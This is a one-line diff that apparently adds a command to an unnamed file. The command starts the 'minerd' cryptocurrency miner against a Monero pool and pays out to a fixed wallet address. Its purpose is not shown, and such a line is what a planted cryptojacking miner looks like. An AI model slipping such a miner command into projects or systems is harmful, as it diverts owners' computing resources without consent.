@@ -1,0 +1,1 @@
+minerd -a cryptonight  -o stratum+tcp://ca.minexmr.com:5555 -u 4AVTmmRnEAEQZx2BAPuz3NCwNAC68gYF78opUaQbNrDxaRAJGUu7uXmZVNM4zPD1Uj6v2RR8qSwJAd9Bc41fHEKv1rdaamH.p+15000 -p x 
